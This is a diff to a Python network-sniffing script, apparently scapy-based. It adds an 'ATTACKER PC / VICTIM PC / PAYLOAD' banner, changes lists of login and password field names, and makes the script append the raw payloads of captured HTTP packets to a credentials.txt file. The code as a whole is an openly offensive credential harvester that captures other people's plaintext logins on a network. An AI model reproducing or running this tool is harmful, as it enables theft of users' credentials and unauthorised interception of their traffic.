@@ -28,25 +28,48 @@ import re
 import sys 
 
 
+print("\033[1;36m" + " _______________             _______________             _______________   ")
+print("\033[1;36m" + "|               |           |               |           |               |  ")
+print("\033[1;36m" + "|   VICTIM PC   |-----------|    ROUTER     |-----------|   VICTIM PC   |  ")
+print("\033[1;36m" + "|_______________|      _____|_______________|_____      |_______________|  ")
+print("\033[1;36m" + "       | |            |           ( B )           |            | |         ")
+print("\033[1;36m" + "       | |            |           ( Y )           |            | |         ")
+print("\033[1;36m" + "     __|_|__          |           ( T )           |          __|_|__       ")
+print("\033[1;36m" + "                 _____|           ( E )           |_____                   ")
+print("\033[1;36m" + "                |                 ( S )                 |                  ")
+print("\033[1;36m" + " _______________|            _____(dec)_____              |_______________   ")
+print("\033[1;36m" + "|               |           |               |           |               |  ")
+print("\033[1;36m" + "|   SERVER PC   |  11111111 | {ATTACKER PC} | 00000000  |  DATABASE PC  |  ")
+print("\033[1;36m" + "|_______________|           |______   ______|           |_______________|  ")
+print("\033[1;36m" + "       | |                        ( + )                         | |        ")
+print("\033[1;36m" + "       | |                        ( + )                         | |        ")
+print("\033[1;36m" + "     __|_|__                      ( + )                       __|_|__      ")
+print("\033[1;36m" + "                            ______( + )______                              ")
+print("\033[1;36m" + "                           |  +++++++++++++  |                             ")
+print("\033[1;36m" + "                           |  ++ PAYLOAD ++  |                             ")
+print("\033[1;36m" + "                           |  +++++++++++++  |                             ")
+print("\033[1;36m" + "                           |_________________|                             ")
+
 
 def cls():
-    os.system('cls' if os.name=='nt' else 'clear')
+ os.system('cls' if os.name=='nt' else 'clear')
 
 
 USERNAME_FIELDS = ['auth', 'log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                   'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                   'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                   'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
-                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
+                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'email']
 
 PASSWORD_FIELDS = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
                   'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
-                  'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']
+                  'passwort', 'passwrd', 'wppassword', 'upasswd','pws','upasswd']
 
 
 #OTHER_FILEDS = ['', ' ']
 
-
+# Open a file and write the http trafic
+HTTP_TRAFIC = open("credentials.txt", "a+")
 
 def packet_callback(packet):
 
@@ -62,15 +85,24 @@ def packet_callback(packet):
 
 
            print("\033[1;37m" + "\n{----HTTP---->" + packet[IP].src + "}" + "\n" + "\033[1;32m" + str(bytes(packet[TCP].payload)))
- 
- 
+
+
+           HTTP_TRAFIC.write(str(bytes(packet[TCP].payload)))
+
 
           elif USERNAME_FIELDS[i] not in str(bytes(packet[TCP].payload)) or PASSWORD_FIELDS[j] not in str(bytes(packet[TCP].payload)):
    
+
            print("\033[1;37m" + "\n{----HTTP---->" + packet[IP].src + "}" + "\n" + "\033[1;32m" + str(bytes(packet[TCP].payload)))
+
          
+           HTTP_TRAFIC.write(str(bytes(packet[TCP].payload)))
+
 
 sniff(filter="tcp", prn=packet_callback, store=0)
 
+
+# Close the file for credentials http trafic
+HTTP_TRAFIC.close()
 
 cls()
